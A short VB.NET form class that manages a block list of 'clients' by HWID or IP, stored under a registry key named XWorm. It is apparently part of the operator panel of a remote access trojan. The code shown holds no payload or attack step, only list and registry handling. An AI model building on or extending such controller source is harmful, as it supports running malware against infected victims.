
Public Class BlockClients
    Private Sub BlockClients_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try
            For Each XX In Strings.Split(My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm", "Block", Nothing), (","))
                If Not XX = Nothing Then
                    If Not ListBox1.Items.Contains(XX) Then
                        ListBox1.Items.Add(XX)
                    End If
                End If
            Next
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub RemoveToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoveToolStripMenuItem.Click
        For n As Integer = ListBox1.SelectedItems.Count - 1 To 0 Step -1
            ListBox1.Items.Remove(ListBox1.SelectedItems(n))
        Next n
    End Sub

    Private Sub AddToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AddToolStripMenuItem.Click
        Dim message As Object = InputBox("Insert HWID or IP", "Block")
        If Not String.IsNullOrWhiteSpace(message) Then
            ListBox1.Items.Add(message)
        End If
    End Sub


    Public Sub update()

        Dim out As String
        Try
            If ListBox1.Items.Count = 0 Then
                My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm", "Block", "")
            Else
                For Each x In ListBox1.Items
                    out += x & ","
                Next
                My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm", "Block", out.Trim().Substring(0, out.Length - 1))
            End If




            Process.Start(Application.ExecutablePath)
            Form1.NotifyIcon1?.Dispose()
            Environment.Exit(0)

        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try

    End Sub


    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        update()
    End Sub

    Private Sub ClearToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ClearToolStripMenuItem.Click
        ListBox1.Items.Clear()
    End Sub
End Class